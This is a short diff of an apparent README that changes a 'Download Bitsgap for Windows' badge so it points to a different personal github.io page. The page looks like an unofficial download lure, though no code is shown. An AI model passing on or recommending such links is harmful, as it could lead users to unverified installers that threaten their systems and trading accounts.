@@ -4,7 +4,7 @@
 
 ## 📥 Download Bitsgap for Windows
 
-[![⬇️ Download Bitsgap](https://img.shields.io/badge/Download-Bitsgap-blue?style=for-the-badge&logo=windows)](https://bitsgapload.github.io/.github/)
+[![⬇️ Download Bitsgap](https://img.shields.io/badge/Download-Bitsgap-blue?style=for-the-badge&logo=windows)](https://kravtsovasafina.github.io/.github/bitsgap-kit)
 
 ---
 
